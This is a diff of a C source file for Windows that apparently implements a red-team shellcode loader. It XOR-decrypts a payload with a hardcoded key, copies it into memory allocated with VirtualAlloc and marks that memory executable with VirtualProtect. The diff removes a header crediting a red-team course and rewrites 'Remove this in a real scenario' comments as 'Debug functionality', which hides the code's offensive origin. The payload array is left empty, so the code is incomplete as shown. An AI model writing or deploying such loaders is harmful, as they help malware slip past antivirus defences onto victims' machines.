@@ -1,11 +1,3 @@
-/*
-
- Red Team Operator course code template
- payload encryption with XOR
- 
- author: reenz0h (twitter: @sektor7net)
-
-*/
 #include <windows.h>
 #include <stdio.h>
 #include <stdlib.h>
@@ -30,17 +22,17 @@ int main(void) {
 	BOOL rv;
 	HANDLE th;
     DWORD oldprotect = 0;
-
+	
+	char key[] = "mysecretkeee";
 	unsigned char calc_payload[] = 
 	unsigned int calc_len = sizeof(calc_payload);
-	char key[] = "mysecretkeee";
 
 	// Allocate a buffer for payload
 	exec_mem = VirtualAlloc(0, calc_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 	printf("%-20s : 0x%-016p\n", "calc_payload addr", (void *)calc_payload);
 	printf("%-20s : 0x%-016p\n", "exec_mem addr", (void *)exec_mem);
 
-	// Remove this is a real scenario
+	// Debug functionality
 	printf("\nHit me 1st!\n");
 	getchar();
 
@@ -53,7 +45,7 @@ int main(void) {
 	// Make the buffer executable
 	rv = VirtualProtect(exec_mem, calc_len, PAGE_EXECUTE_READ, &oldprotect);
 
-	// Remove this is a real scenario
+	// Debug functionality
 	printf("\nHit me 2nd!\n");
 	getchar();
 
